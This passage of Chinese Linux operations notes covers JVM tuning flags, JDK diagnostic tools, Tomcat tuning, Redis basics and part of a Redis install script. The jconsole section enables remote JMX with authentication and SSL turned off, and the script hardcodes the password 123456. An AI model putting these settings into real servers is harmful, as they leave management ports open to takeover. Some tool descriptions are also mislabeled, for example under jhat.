|      -Xmn       |   年轻代大小(1.4or lator)   |                      | **注意**：此处的大小是（eden+ 2 survivor space). 与jmap -heap中显示的New gen是不同的。 整个堆大小=年轻代大小 + 年老代大小 + 持久代大小. 增大年轻代后,将会减小年老代大小.此值对系统性能影响较 大,Sun官方推荐配置为整个堆的3/8 |
|   -XX:NewSize   | 设置年轻代大小(for 1.3/1.4) |                      |                                                              |
| -XX:MaxNewSize  |  年轻代最大值(for 1.3/1.4)  |                      |                                                              |
|  -XX:PermSize   | 设置持久代(perm gen)初始值  |    物理内存的1/64    |                                                              |
| -XX:MaxPermSize |      设置持久代最大值       |    物理内存的1/4     |                                                              |
|      -Xss       |     每个线程的堆栈大小      |                      | JDK5.0以后每个线程堆栈大小为1M,以前每个线程堆栈大小为256K.更具应用的线程所需内存大小进行 调整. 在相同物理内存下,减小这个值能生成更多的线程.但是操作系统对一个进程内的线程数还是有限制的,不能无限生成,经验值在3000~5000左右 一般小的应用， 如果栈不是很深， 应该是128k够用的 大的应用建议使用256k。这个选项对性能影响比较大，需要严格的测试。 |

|        **参数名称**         |                          **含义**                          | **默认值** |                                                              |
| :-------------------------: | :--------------------------------------------------------: | :--------: | :----------------------------------------------------------: |
|     -XX:ThreadStackSize     |                     Thread Stack Size                      |            | (0 means use default stack size) [Sparc: 512; Solaris x86: 320 (was 256 prior in 5.0 and earlier); Sparc 64 bit: 1024; Linuxamd64: 1024 (was 0 in 5.0 and earlier); all others 0.] |
|        -XX:NewRatio         | 年轻代(包括Eden和两个Survivor区)与年老代的比值(除去持久代) |            | -XX:NewRatio=4表示年轻代与年老代所占比值为1:4, 年轻代占整个堆栈的1/5Xms=Xmx并且设置了Xmn 的情况下，该参数不需要进行设置。 |
|      -XX:SurvivorRatio      |                Eden区与Survivor区的大小比值                |            | 设置为8,则两个Survivor区与一个Eden区的比值为2:8, 一个Survivor区占整个年轻代的1/10 |
|  -XX:LargePageSizeInBytes   |        内存页的大小不可设置过 大， 会影响Perm的大小        |            |                            =128m                             |
| -XX:+UseFastAccessorMethods |                     原始类型的快速优化                     |            |                                                              |
|   -XX:+DisableExplicitGC    |                      关闭System.gc()                       |            |                    这个参数需要严格的测试                    |
|  -XX:MaxTenuringThreshold   |                        垃圾最大年龄                        |            | 如果设置为0的话,则年轻代对象不经过Survivor区,直接进入年老代. 对于年老代比较多的应用,可以提高效率. 如果将此值设置为一个较大值,则年轻代对象会在Survivor区进行多次复制,这样可以增加对象再年轻代的存活 时间,增加在年轻代即被回收的概率 该参数只有在串行GC时才有效 |
|     -XX:+AggressiveOpts     |                          加快编译                          |            |                                                              |
|    -XX:+UseBiasedLocking    |                      锁机制的性能改善                      |            |                                                              |
|         -Xnoclassgc         |                        禁用垃圾回收                        |            |                                                              |
| -XX:SoftRefLRUPolicyMSPerMB |          每兆堆空闲空间中SoftReference 的存活时间          |            | 可达的对象在上次被引用后将保留一段时间。 缺省值是堆中每个空闲兆字节的生命周期的一秒钟 |
| -XX:PretenureSizeThreshold  |               对象超过多大是直接在旧生代分配               |     0      | 单位字节 新生代采用Parallel Scavenge GC时无效 另一种直接在旧生代分配的情况是大的数组对象,且数组中无外部引用对象. |
|  XX:TLABWasteTargetPercent  |                    TLAB占eden区的百分比                    |     1%     |                                                              |
|   -XX:+*CollectGen0First    |                     FullGC时是否先YGC                      |   false    |                                                              |

**并行收集器相关参数**

|   **-XX:+UseParallelGC**   |           **Full GC**采用parallel MSC            |      | 选择垃圾收集器为并行收集器.此配置仅对年轻代有效.即上述配置下,年轻代使用并发收集,而年老代仍旧使用串行收集 |
| :------------------------: | :----------------------------------------------: | :--: | :----------------------------------------------------------: |
|      -XX:+UseParNewGC      |               设置年轻代为并行收集               |      | 可与CMS收集同时使用 JDK5.0以上,JVM会根据系统配置自行设置,所以无需再设置此值 |
|   -XX:ParallelGCThreads    |                并行收集器的线程数                |      |          此值最好配置与处理器数目相等 同样适用于CMS          |
|   -XX:+UseParallelOldGC    | 年老代垃圾收集方式为并行收集(ParallelCompacting) |      |                  这个是JAVA 6出现的参数选项                  |
|    -XX:MaxGCPauseMillis    |    每次年轻代垃圾回收的最长时间(最大暂停时间)    |      |    如果无法满足此时间,JVM会自动调整年轻代大小,以满足此值.    |
| -XX:+UseAdaptiveSizePolicy |    自动选择年轻代区大小和相应的Survivor区比例    |      | 设置此选项后,并行收集器会自动选择年轻代区大小和相应的Survivor区比例,以达到目标系统规定的最低相应时间或者收集频率等,此值建议使用并行收集器时,一直打开. |
|      -XX:GCTimeRatio       |      设置垃圾回收时间占程序运行时间的百分比      |      |                        公式为1/(1+n)                         |
| -XX:+ScavengeBeforeFullGC  |                 Full GC前调用YGC                 | true |                                                              |

**CMS相关参数**

|      **-XX:+UseConcMarkSweepGC**      |               使用CMS内存收集               |      | 测试中配置这个以后，-XX:NewRatio=4的配置可能失效,所以,此时年轻代大小最好用-Xmn设置 |
| :-----------------------------------: | :-----------------------------------------: | :--: | :----------------------------------------------------------: |
|          -XX:+AggressiveHeap          |                                             |      | 试图是使用大量的物理内存 长时间大内存使用的优化，能检查计算资源（内存， 处理器数量） 至少需要256MB内存 大量的CPU／内存， （在1.4.1在4CPU的机器上已经显示有提升） |
|    -XX:CMSFullGCsBeforeCompaction     |            多少次后进行内存压缩             |      | 由于并发收集器不对内存空间进行压缩,整理,所以运行一段时间以后会产生"碎片",使得运行效率降低.此值设置运行多少次GC以后对内存空间进行压缩,整理. |
|     -XX:+CMSParallelRemarkEnabled     |                降低标记停顿                 |      |                                                              |
|   -XX+UseCMSCompactAtFullCollection   |       在FULLGC的时候， 对年老代的压缩       |      | CMS是不会移动内存的， 因此， 这个非常容易产生碎片， 导致内存不够用， 因此， 内存的压缩这个时候就会被启用。增加这个参数是个好习惯。 可能会影响性能,但是可以消除碎片 |
|  -XX:+UseCMSInitiatingOccupancyOnly   |      使用手动定义初始化定义开始CMS收集      |      |                  禁止hostspot自行触发CMS GC                  |
| -XX:CMSInitiatingOccupancyFraction=70 | 使用cms作为垃圾回 收 使用70％ 后开始CMS收集 |  92  |                                                              |
|        -XX:+UseConcMarkSweepGC        |               使用CMS内存收集               |      | 测试中配置这个以后,- XX:NewRatio=4的配置可能失效， 所以此时年轻代大小最好用-Xmn设置 |
| XX:CMSInitiatingPermOccupancyFraction |      设置PermGen使用到达多少比率时触发      |  92  |                                                              |
|        -XX:+CMSIncrementalMode        |               设置为增量模式                |      |                        用于单CPU情况                         |
|     -XX:+CMSClassUnloadingEnabled     |                                             |      |                                                              |

**辅助信息**

|           **-XX:+PrintGC**            |                                                              |      | 输出形式:[GC 118250K->113543K(130112K),0.0094143 secs][Full GC 121376K->10414K(130112K), 0.0650971 secs] |
| :-----------------------------------: | :----------------------------------------------------------: | :--: | :----------------------------------------------------------: |
|          -XX:+PrintGCDetails          |                                                              |      | 输出形式:[GC [DefNew: 8614K->781K(9088K),0.0123035 secs] 118250K->113543K(130112K), 0.0124633 secs][GC [DefNew: 8614K->8614K(9088K), 0.0000665secs] 121376K->10414K(130112K), 0.0436268 secs] |
|        -XX:+PrintGCTimeStamps         |                                                              |      |                                                              |
|    -XX:+PrintGC:PrintGCTimeStamps     |                                                              |      | 可与-XX:+PrintGC -XX:+PrintGCDetails混合使用输 出 形 式 :11.851: [GC 98328K->93620K(130112K),0.0082960 secs] |
|  -XX:+PrintGCApplicationStoppedTime   |       打印垃圾回收期间程序暂停的时间.可与上面混合使用        |      | 输出形式:Total time for which application threads were stopped: 0.0468229 seconds |
| -XX:+PrintGCApplicationConcurrentTime | 打印每次垃圾回收前, 程序未中断的 执 行 时 间.可与上面混合使用 |      |         输出形式:Application time: 0.5291524 seconds         |
|          -XX:+PrintHeapAtGC           |                   打印GC前后的详细堆栈信息                   |      |                                                              |
|           -Xloggc:filename            |     把相关日志信息记录到文件以便分析. 与上面几个配合使用     |      |                                                              |
|           **-XX:+PrintGC**            |                                                              |      | 输出形式:[GC 118250K->113543K(130112K),0.0094143 secs][Full GC 121376K->10414K(130112K), 0.0650971 secs] |
|       -XX:+PrintClassHistogram        |        garbage collects before printing thehistogram.        |      |                                                              |
|            -XX:+PrintTLAB             |                   查看TLAB 空间的使用情况                    |      |                                                              |
|     XX:+PrintTenuringDistribution     |            查看每次minor GC 后新的存活周期的阈值             |      |                                                              |

#### 44.7.11 JVM相关工具

##### 44.7.11.1  JVM 工具概述

**$JAVA_HOME/bin下**

| **命令**  | **说明**                                    |
| --------- | ------------------------------------------- |
| jps       | 查看所有jvm进程                             |
| jinfo     | 查看进程的运行环境参数，主要是jvm命令行参数 |
| jstat     | 对jvm应用程序的资源和性能进行实时监控       |
| jstack    | 查看所有线程的运行状态                      |
| jmap      | 查看jvm占用物理内存的状态                   |
| jhat      | +UseParNew                                  |
| jconsole  | 图形工具                                    |
| jvisualvm | 图形工具                                    |

##### 44.7.11.2 jps

```
#1.概述
JVM 进程状态工具



#2.格式：
jps：Java virutal machine Process Status tool， jps [-q] [-mlvV] [<hostid>]
-q：静默模式；
-v：显示传递给jvm的命令行参数；
-m：输出传入main方法的参数；
-l：输出main类或jar完全限定名称；
-v：显示通过flag文件传递给jvm的参数； [<hostid>]：主机id，默认为localhost；



3.范例：
#显示java进程[root@tomcat ~]#jps
22357	Jps
21560	Main
21407	HelloWorld

#详细列出当前Java进程信息
[root@tomcat ~]#jps -l -v
21560 org.netbeans.Main -Djdk.home=/usr/local/jdk - Dnetbeans.default_userdir_root=/root/.visualvm - Dnetbeans.dirs=/usr/local/jdk/lib/visualvm/visualvm:/usr/local/jdk/lib/visualvm/ profiler: -Dnetbeans.home=/usr/local/jdk/lib/visualvm/platform -Xms24m -Xmx256m
-Dsun.jvmstat.perdata.syncWaitMs=10000 -Dsun.java2d.noddraw=true - Dsun.java2d.d3d=false -Dnetbeans.keyring.no.master=true - Dplugin.manager.install.global=false --add-exports=java.desktop/sun.awt=ALL- UNNAMED --add-exports=jdk.jvmstat/sun.jvmstat.monitor.event=ALL-UNNAMED --add- exports=jdk.jvmstat/sun.jvmstat.monitor=ALL-UNNAMED --add- exports=java.desktop/sun.swing=ALL-UNNAMED --add- exports=jdk.attach/sun.tools.attach=ALL-UNNAMED --add-modules=java.activation - XX:+IgnoreUnrecognizedVMOptions -XX:+HeapDumpOnOutOfMemoryError - XX:HeapDumpPath=/root/.visualvm/8u131/var/log/heapdump.hprof
22270 sun.tools.jps.Jps - Denv.class.path=/usr/local/jdk/lib/:/usr/local/jdk/jre/lib/ - Dapplication.home=/usr/local/jdk1.8.0_241 -Xms8m
21407 HelloWorld -Xms256m -Xmx512m
```

##### 44.7.11.3 jinfo

```
#1.概述
输出给定的java进程的所有配置信息



#2.格式
jinfo [option] <pid>
-flags：打印 VM flags
-sysprops：to print Java system properties
-flag <name>：to print the value of the named VM flag



#3.范例
#先获得一个java进程ID，然后jinfo 
[root@tomcat ~]#jps
22357 Jps
21560 Main
21407 HelloWorld


[root@tomcat ~]#jinfo 21407
Attaching to process ID 21407, please wait... Debugger attached successfully.
Server compiler detected. JVM version is 25.241-b07 Java System Properties:

java.runtime.name = Java(TM) SE Runtime Environment java.vm.version = 25.241-b07
sun.boot.library.path = /usr/local/jdk1.8.0_241/jre/lib/amd64 java.vendor.url = http://java.oracle.com/
java.vm.vendor = Oracle Corporation path.separator = :
java.rmi.server.randomIDs = true file.encoding.pkg = sun.io
java.vm.name = Java HotSpot(TM) 64-Bit Server VM sun.os.patch.level = unknown
sun.java.launcher = SUN_STANDARD user.country = US
user.dir = /data
java.vm.specification.name = Java Virtual Machine Specification java.runtime.version = 1.8.0_241-b07
java.awt.graphicsenv = sun.awt.X11GraphicsEnvironment os.arch = amd64
java.endorsed.dirs = /usr/local/jdk1.8.0_241/jre/lib/endorsed java.io.tmpdir = /tmp
line.separator =


java.vm.specification.vendor = Oracle Corporation os.name = Linux
sun.jnu.encoding = UTF-8
java.library.path = /usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib java.specification.name = Java Platform API Specification
java.class.version = 52.0
sun.management.compiler = HotSpot 64-Bit Tiered Compilers os.version = 4.18.0-147.el8.x86_64
user.home = /root user.timezone = Asia/Shanghai
java.awt.printerjob = sun.print.PSPrinterJob file.encoding = UTF-8 java.specification.version = 1.8
user.name = root
java.class.path = /usr/local/jdk/lib/:/usr/local/jdk/jre/lib/ java.vm.specification.version = 1.8
sun.arch.data.model = 64 sun.java.command = HelloWorld java.home = /usr/local/jdk1.8.0_241/jre user.language = en
java.specification.vendor = Oracle Corporation awt.toolkit = sun.awt.X11.XToolkit java.vm.info = mixed mode
java.version = 1.8.0_241
java.ext.dirs = /usr/local/jdk1.8.0_241/jre/lib/ext:/usr/java/packages/lib/ext

sun.boot.class.path =
/usr/local/jdk1.8.0_241/jre/lib/resources.jar:/usr/local/jdk1.8.0_241/jre/lib/rt
.jar:/usr/local/jdk1.8.0_241/jre/lib/sunrsasign.jar:/usr/local/jdk1.8.0_241/jre/ lib/jsse.jar:/usr/local/jdk1.8.0_241/jre/lib/jce.jar:/usr/local/jdk1.8.0_241/jre
/lib/charsets.jar:/usr/local/jdk1.8.0_241/jre/lib/jfr.jar:/usr/local/jdk1.8.0_24 1/jre/classes
java.vendor = Oracle Corporation file.separator = /
java.vendor.url.bug = http://bugreport.sun.com/bugreport/ sun.io.unicode.encoding = UnicodeLittle
sun.cpu.endian = little sun.cpu.isalist =

VM Flags:
Non-default VM flags: -XX:CICompilerCount=2 -XX:InitialHeapSize=268435456 - XX:MaxHeapSize=536870912 -XX:MaxNewSize=178913280 -XX:MinHeapDeltaBytes=196608 - XX:NewSize=89456640 -XX:OldSize=178978816 -XX:+UseCompressedClassPointers - XX:+UseCompressedOops -XX:+UseFastUnorderedTimeStamps
Command line:	-Xms256m -Xmx512m


[root@tomcat ~]#jinfo -flags 21407
Attaching to process ID 21407, please wait... Debugger attached successfully.
Server compiler detected. JVM version is 25.241-b07
Non-default VM flags: -XX:CICompilerCount=2 -XX:InitialHeapSize=268435456 - XX:MaxHeapSize=536870912 -XX:MaxNewSize=178913280 -XX:MinHeapDeltaBytes=196608 - XX:NewSize=89456640 -XX:OldSize=178978816 -XX:+UseCompressedClassPointers - XX:+UseCompressedOops -XX:+UseFastUnorderedTimeStamps
Command line:	-Xms256m -Xmx512m
```

#####  44.7.11.4 jstat

```
#1.概述
输出指定的java进程的统计信息




#2.格式
jstat -help|-options
jstat -<option> [-t] [-h<lines>] <vmid> [<interval> [<count>]] [<interval> [<count>]]
interval：时间间隔，单位是毫秒；
count：显示的次数；

#返回可用统计项列表# jstat -options
-class：class loader
-compiler：JIT
-gc：gc
-gccapacity：统计堆中各代的容量
-gccause：
-gcmetacapacity
-gcnew：新生代
-gcnewcapacity
-gcold：老年代
-gcoldcapacity
-gcutil
-printcompilation



S0C: Current survivor space 0 capacity (kB). S1C: Current survivor space 1 capacity (kB). S0U: Survivor space 0 utilization (kB).
S1U: Survivor space 1 utilization (kB). EC: Current eden space capacity (kB).
EU: Eden space utilization (kB).
OC: Current old space capacity (kB). OU: Old space utilization (kB).
MC: Metaspace capacity (kB).
MU: Metacspace utilization (kB).
CCSC: Compressed class space capacity (kB). CCSU: Compressed class space used (kB).
YGC: Number of young generation garbage collection events. YGCT: Young generation garbage collection time.
FGC: Number of full GC events. FGCT: Full garbage collection time. GCT: Total garbage collection time.

TT: Tenuring threshold.
MTT: Maximum tenuring threshold. DSS: Desired survivor size (kB).




#3.范例
[root@tomcat ~]#jstat -gc 21407	
S0C	S1C	S0U	S1U	EC	EU	OC	OU	MC	MU
CCSC	CCSU	YGC	YGCT	FGC	FGCT	GCT			
8704.0 8704.0 1563.6	0.0	69952.0	58033.0	174784.0	0.0	9344.0
8830.0 1152.0 1013.0	2	0.050	0	0.000	0.050	

S0C:S0 区 容 量           YGC：新生代的垃圾回收次数 YGCT：新生代垃圾回收消耗的时长； FGC：Full GC的次数
FGCT：Full GC消耗的时长
GCT：GC消耗的总时长

#3次，一秒一次
[root@tomcat ~]#jstat -gcnew 21407 1000 3

S0C	S1C	S0U	S1U	TT	MTT	DSS	EC	EU	YGC	YGCT
8704.0	8704.0	1563.6	0.0	15	15	4352.0	69952.0	62794.3		2	0.050
8704.0	8704.0	1563.6	0.0	15	15	4352.0	69952.0	62794.3		2	0.050
8704.0	8704.0	1563.6	0.0	15	15	4352.0	69952.0	63074.5		2	0.050
```

#####  44.7.11.5 jstack

```
#1.概述
程序员常用堆栈情况查看工具
jstack：查看指定的java进程的线程栈的相关信息



#2.格式
jstack [-l] <pid>
jstack -F [-m] [-l] <pid>
-l：long listings，会显示额外的锁信息，因此，发生死锁时常用此选项
-m：混合模式，既输出java堆栈信息，也输出C/C++堆栈信息
-F：当使用"jstack -l PID"无响应，可以使用-F强制输出信息



#3.范例
#先获得一个java进程PID，然后jinfo
[root@tomcat ~]#jstack -l 21407 
2022-07-15 13:49:56
Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.241-b07 mixed mode):


"RMI TCP Connection(4)-10.0.0.101" #16 daemon prio=9 os_prio=0 tid=0x00007f279c29e800 nid=0x5753 runnable [0x00007f279b181000]
java.lang.Thread.State: RUNNABLE
at java.net.SocketInputStream.socketRead0(Native Method)
......
```

#####  44.7.11.6 jmap

```
#1.概述
Memory Map, 用于查看堆内存的使用状态


#2.案例
#查看进程堆内存情况
[root@tomcat ~]#jmap -heap 21407
Attaching to process ID 21407, please wait...
Debugger attached successfully.
Server compiler detected.
JVM version is 25.241-b07
using thread-local object allocation.
Mark Sweep Compact GC

Heap Configuration:
   MinHeapFreeRatio         = 40
   MaxHeapFreeRatio         = 70
   MaxHeapSize              = 536870912 (512.0MB)
   NewSize                  = 89456640 (85.3125MB)
   MaxNewSize               = 178913280 (170.625MB)
   OldSize                  = 178978816 (170.6875MB)
   NewRatio                 = 2
   SurvivorRatio            = 8
   MetaspaceSize            = 21807104 (20.796875MB)
   CompressedClassSpaceSize = 1073741824 (1024.0MB)
   MaxMetaspaceSize         = 17592186044415 MB
   G1HeapRegionSize         = 0 (0.0MB)
   
Heap Usage:
New Generation (Eden + 1 Survivor Space):
   capacity = 80543744 (76.8125MB)
   used     = 4893096 (4.666419982910156MB)
   free     = 75650648 (72.14608001708984MB)
   6.075078903707283% used
Eden Space:
   capacity = 71630848 (68.3125MB)
   used     = 3301800 (3.1488418579101562MB)
   free     = 68329048 (65.16365814208984MB)
   4.609466580655306% used
From Space:
   capacity = 8912896 (8.5MB)
   used     = 1591296 (1.517578125MB)
   free     = 7321600 (6.982421875MB)
   17.85386029411765% used
To Space:
   capacity = 8912896 (8.5MB)
   used     = 0 (0.0MB)
   free     = 8912896 (8.5MB)
   0.0% used
tenured generation:
   capacity = 178978816 (170.6875MB)
   used     = 0 (0.0MB)
   free     = 178978816 (170.6875MB)
   0.0% used
   
4926 interned Strings occupying 389832 bytes.
```

#####  44.7.11.7 jhat

```
#1.概述
Java Heap Analysis Tool 堆分析工具



#2.格式
jmap [option] <pid> 
#查看堆空间的详细信息：
jmap -heap <pid>



#3.案例
[root@t1 ~]#jmap -heap 96334
Attaching to process ID 96334, please wait...
Debugger attached successfully.
Server compiler detected.
JVM version is 25.251-b08

using thread-local object allocation.
Mark Sweep Compact GC

Heap Configuration:
   MinHeapFreeRatio         = 40
   MaxHeapFreeRatio         = 70
   MaxHeapSize              = 251658240 (240.0MB)
   NewSize                  = 5570560 (5.3125MB)
   MaxNewSize               = 83886080 (80.0MB)
   OldSize                  = 11206656 (10.6875MB)
   
   
#查看堆内存中的对象的数目：
jmap -histo[:live] <pid>
 live：只统计活动对象；
 
#保存堆内存数据至文件中，而后使用jvisualvm或jhat进行查看：
jmap -dump:<dump-options> <pid>
 dump-options:
 live   dump only live objects; if not specified, all objects in the heap are dumped.
 format=b     binary format
 file=<file> dump heap to <file>
```

#####  44.7.11.8 jconsole

```
#1.概述
图形化工具,可以用来查看Java进程信息

JMX（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用。

JMX最常见的场景是监控Java程序的基本信息和运行情况，任何Java程序都可以开启JMX，然后使用JConsole或Visual VM进行预览。





#2.格式
#为Java程序开启JMX很简单，只要在运行Java程序的命令后面指定如下命令即可
-Djava.rmi.server.hostname=127.0.0.1
-Dcom.sun.management.jmxremote.port=1000
-Dcom.sun.management.jmxremote.ssl=false
-Dcom.sun.management.jmxremote.authenticate=false


在tomcat开启远程JMX如下配置
vim /usr/local/tomcat/bin/catalina.sh
CATALINA_OPTS="$CATALINA__OPTS
-Dcom.sun.management.jmxremote         #启用远程监控JMX 
-Dcom.sun.management.jmxremote.port=XXXXX       #默认启动的JMX端口号，要和
zabbix添加主机时候的端口一致即可
-Dcom.sun.management.jmxremote.authenticate=false    #不使用用户名密码
-Dcom.sun.management.jmxremote.ss1=false       #不使用ssl认证
-Djava.rmi.server.hostname=<JAVA主机IP>"     #tomcat主机自己的IP地址,不要写zabbix服务器的地址





#3.案例：开启远程JMX功能
[root@tomcat2 ~]# vim /usr/local/tomcat/bin/catalina.sh
# -----------------------------------------------------------------------------
#加上下面这一行，服务启动成功会开启12345端口
CATALINA_OPTS="$CATALINA__OPTS -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=12345 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostname=10.0.0.28"
# -----------------------------------------------------------------------------
```

**进行远程连接**

![1657616903342](linux体系.assets/1657616903342.png)

![1657616950329](linux体系.assets/1657616985090.png)

![1657617032086](linux体系.assets/1657617032086.png)

#### 44.7.12 Tomcat性能优化常用配置

##### 44.7.12.1 内存空间优化

```
#1.格式
JAVA_OPTS="-server -Xms4g -Xmx4g -XX:NewSize= -XX:MaxNewSize= "

-server：服务器模式
-Xms：堆内存初始化大小
-Xmx：堆内存空间上限
-XX:NewSize=：新生代空间初始化大小 
-XX:MaxNewSize=：新生代空间最大值




#2.公司真实生产案例
[root@centos8 ~]#vim /usr/local/tomcat/bin/catalina.sh 
JAVA_OPTS="-server -Xms4g -Xmx4g -Xss512k -Xmn1g -XX:CMSInitiatingOccupancyFraction=65 -XX:+AggressiveOpts -XX:+UseBiasedLocking -XX:+DisableExplicitGC -XX:MaxTenuringThreshold=10 -XX:NewRatio=2 -XX:PermSize=128m -XX:MaxPermSize=512m -XX:CMSFullGCsBeforeCompaction=5 -XX:+ExplicitGCInvokesConcurrent -XX:+UseConcMarkSweepGC -XX:+UseParNewGC -XX:+CMSParallelRemarkEnabled -XX:+UseCMSCompactAtFullCollection -XX:LargePageSizeInBytes=128m -XX:+UseFastAccessorMethods"

#一台tomcat服务器并发连接数不高,生产建议分配物理内存通常4G到8G较多,如果需要更多连接,一般会利用
虚拟化技术实现多台tomcat
```

![1657617711463](linux体系.assets/1657617711463.png)

#####  44.7.12.2 线程池调整

```
[root@centos8 ~]#vim /usr/local/tomcat/conf/server.xml
......
<Connector port="8080" protocol="HTTP/1.1"  connectionTimeout="20000"
redirectPort="8443" />
......


常用属性：
connectionTimeout ：连接超时时长,单位ms
maxThreads：最大线程数，默认200
minSpareThreads：最小空闲线程数
maxSpareThreads：最大空闲线程数
acceptCount：当启动线程满了之后，等待队列的最大长度，默认100
URIEncoding：URI 地址编码格式，建议使用 UTF-8
enableLookups：是否启用客户端主机名的DNS反向解析，缺省禁用，建议禁用，就使用客户端IP就行
compression：是否启用传输压缩机制，建议 "on"，CPU和流量的平衡
   compressionMinSize：启用压缩传输的数据流最小值，单位是字节
   compressableMimeType：定义启用压缩功能的MIME类型text/html, text/xml, text/css, text/javascrip
```

## 45.企业级Redis

### 45.1 清除缓存命令

```
[root@centos8 ~]#man proc
......
/proc/sys/vm/drop_caches (since Linux 2.6.16)
Writing to this file causes the kernel to drop clean caches, dentries, and inodes from memory, causing that memory to become free. This can be useful formemory management testing and performing reproducible filesystem benchmarks.Because writing to this file causes the benefits of caching to be lost, it can degrade overall system performance.

To free pagecache, use: #清除页缓存
echo 1 > /proc/sys/vm/drop_caches
To free dentries and inodes, use:

echo 2 > /proc/sys/vm/drop_caches  #清除记录和节点
To free pagecache, dentries and inodes, use:

echo 3 > /proc/sys/vm/drop_caches  #所有的都清除
Because writing to this file is a nondestructive operation and dirty objects 
are not freeable, the user should run sync(1) first.



#案例：
[root@centos8 ~]#cat /proc/sys/vm/drop_caches
0
[root@centos8 ~]#free -h
             total       used       free     shared buff/cache   available
Mem:         952Mi       110Mi       84Mi       0.0Ki       757Mi       697Mi
Swap:        2.0Gi       66Mi       1.9Gi

[root@centos8 ~]#echo 3 > /proc/sys/vm/drop_caches
[root@centos8 ~]#free -h
             total       used       free     shared buff/cache   available
Mem:         952Mi       109Mi      794Mi       0.0Ki       48Mi       749Mi
Swap:        2.0Gi       66Mi       1.9Gi
```

### 45.2 用户请求CDN流程

![1657628432628](linux体系.assets/1657628432628.png)

```
1. 用户向 www.test.com 下的某图片资源（如：1.jpg）发起请求，会先向 Local DNS 发起域名解析请求。
2. 当 Local DNS 解析 www.test.com 时，会发现已经配置了 CNAME www.test.com.cdn.dnsv1.com ，解析请求会发送至 Tencent DNS（GSLB），GSLB 为腾讯云自主研发的调度体系，会为请求分配最佳节点 IP。
3. Local DNS 获取 Tencent DNS 返回的解析 IP。
4. 用户获取解析 IP。
5. 用户向获取的 IP 发起对资源 1.jpg 的访问请求。
6. 若该 IP 对应的节点缓存有 1.jpg，则会将数据直接返回给用户（10），此时请求结束。若该节点未缓存 1.jpg，则节点会向业务源站发起对 1.jpg 的请求（6、7、8），获取资源后，结合用户自定义配置的缓存策略，将资源缓存至节点（9），并返回给用户（10），此时请求结束。
```

### 45.3 Redis部署与使用

#### 45.3.1 RDBMS和NOSQL的特点及优缺点

![1657629274459](linux体系.assets/1657629274459.png)

#### 45.3.2 Redis特性

```
速度快: 10W QPS,基于内存,C语言实现
单线程
持久化
支持多种数据结构
支持多种编程语言
功能丰富: 支持Lua脚本,发布订阅,事务,pipeline等功能
简单: 代码短小精悍(单机核心代码只有23000行左右),单线程开发容易,不依赖外部库,使用简单
主从复制
支持高可用和分布式
```

**单线程**

Redis 6.0版本前一直是单线程方式处理用户的请求

![1657629869131](linux体系.assets/1657629869131.png)

单线程为何如此快?

- 纯内存
- 非阻塞
- 避免线程切换和竞态消耗

![1657629928631](linux体系.assets/1657629928631.png)

```
注意事项:

一次只运行一条命令
拒绝长(慢)命令:keys, flushall, flushdb, slow lua script, mutil/exec, operate bigvalue(collection)
其实不是单线程:(只是处理用户的请求是单线程) 早期版本是单进程单线程,3版本后实际还有其它的线程, fysnc file descriptor,close file descriptor
```

#### 45.3.3 redis对比memcached

```
支持数据的持久化：可以将内存中的数据保持在磁盘中，重启redis服务或者服务器之后可以从备份文件中恢复数据到内存继续使用。
支持更多的数据类型：支持string(字符串)、hash(哈希数据)、list(列表)、set(集合)、zset(有序集合)。
支持数据的备份：可以实现类似于数据的master-slave模式的数据备份，另外也支持使用快照+AOF。
支持更大的value数据：memcache单个key value最大只支持1MB，而redis最大支持512MB(生产不建议超过2M,性能受影响)。
在Redis6版本前,Redis 是单线程，而memcached是多线程，所以单机情况下没有memcached 并发高,性能更好,但redis 支持分布式集群以实现更高的并发，单Redis实例可以实现数万并发。
支持集群横向扩展：基于redis cluster的横向扩展，可以实现分布式集群，大幅提升性能和数据安全性。
都是基于 C 语言开发。
```

#### 45.3.4 一键编译安装redis脚本

```
下载当前最新release版本redis 源码包：http://download.redis.io/releases/
#!/bin/bash
#      
#********************************************************************
#Author:        liusenbiao
#Date:          2022-07-10
#FileName：     install_redis.sh
#Description：  通用脚本：在线一键编译安装Redis
#********************************************************************
SRC_DIR=/usr/local/src
COLOR="echo -e \\033[01;31m"
END='\033[0m'
CPUS=`lscpu |awk '/^CPU\(s\)/{print $2}'`

URL='https://download.redis.io/releases/'
REDIS_FILE=redis-6.2.2.tar.gz
VERSION=`echo $REDIS_FILE |awk -F"[-.]" '{print $2}'`
PASSWORD=123456
INSTALL_DIR=/apps/redis

rpm -q wget &> /dev/null || yum -y install wget
os(){
    if grep -Eqi "CentOS" /etc/issue || grep -Eq "CentOS" /etc/*-release;then
        rpm -q redhat-lsb-core &> /dev/null || { ${COLOR}"安装lsb_release工具"${END};yum -y install  redhat-lsb-core &> /dev/null; }
    fi
    OS_ID=`lsb_release -is`
}

check_file (){
    cd ${SRC_DIR}
    rpm -q wget &> /dev/null || yum -y install wget &> /dev/null
    if [ ! -e ${REDIS_FILE} ];then
        ${COLOR}"缺少${REDIS_FILE}文件"${END}
        ${COLOR}'开始下载REDIS源码包'${END}
        wget ${URL}${REDIS_FILE} || { ${COLOR}"Redis 源码下载失败"${END}; exit; } 
    else
        ${COLOR}"相关文件已准备好"${END}
    fi
}

install(){
    [ -d ${INSTALL_DIR} ] && { ${COLOR}"Redis已存在，安装失败"${END};exit; }
    ${COLOR}"开始安装REDIS"${END}
    ${COLOR}"开始安装REDIS依赖包"${END}
    if [ ${VERSION} == "6" ] ;then
        if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
            yum  -y install gcc jemalloc-devel systemd-devel &> /dev/null || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        else
            apt -y install make gcc libjemalloc-dev libsystemd-dev &> /dev/null  || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        fi
    else
         if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
            yum  -y install gcc jemalloc-devel &> /dev/null || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        else
            apt -y install make gcc libjemalloc-dev &> /dev/null  || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        fi
